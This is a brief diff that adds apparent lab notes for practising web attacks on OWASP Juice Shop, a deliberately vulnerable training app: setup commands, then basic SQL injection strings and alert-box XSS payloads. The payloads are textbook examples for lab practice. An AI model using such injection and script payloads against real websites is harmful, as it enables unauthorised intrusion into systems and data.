@@ -1,0 +1,29 @@
+Cybersecurity Commands Documentation
+
+1. System Update and Preparation
+
+sudo apt update && sudo apt upgrade -y
+
+2. Installing Juice Shop
+
+git clone https://github.com/juice-shop/juice-shop.git
+cd juice-shop
+npm install
+npm start
+
+3. SQL Injection Commands
+
+Basic SQL Injection Payloads
+
+' OR '1'='1'; --
+" OR "1"="1"; --
+' OR 'x'='x'; --
+
+
+4. Cross-Site Scripting (XSS) Commands
+
+Basic XSS Payloads
+
+<script>alert('XSS Attack!')</script>
+"><script>alert('XSS')</script>
+
